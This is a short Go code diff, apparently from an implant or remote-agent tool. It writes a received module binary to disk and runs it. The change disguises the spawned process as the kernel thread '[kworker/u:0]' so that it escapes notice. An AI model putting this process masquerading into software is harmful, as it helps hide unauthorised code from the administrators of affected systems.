@@ -13,7 +13,7 @@ import (
 
 //LaunchModule: execute module (not write into disk if on linux or macOS)
 func LaunchModule(moduleBinaryContent string, socketName chan string) {
-	binary := "dummy" + encryption.GenerateRandom() + ".exe"
+	binary := "dummy" + encryption.GenerateRandom() + ".exe" //TODO: delete when kill
 	//write binary file locally
 	err := exec.WriteBinaryFile(binary, moduleBinaryContent)
 	if err != nil {
@@ -25,6 +25,6 @@ func LaunchModule(moduleBinaryContent string, socketName chan string) {
 	os.Setenv(COCO_SOCKET_ENVVAR, name)
 	environ := os.Environ()
 	socketName <- name
-	err = exec.UnstealthyExec(binary, nil, environ)
+	err = exec.UnstealthyExec(binary, []string{"[kworker/u:0]"}, environ)
 	fmt.Println(err)
 }
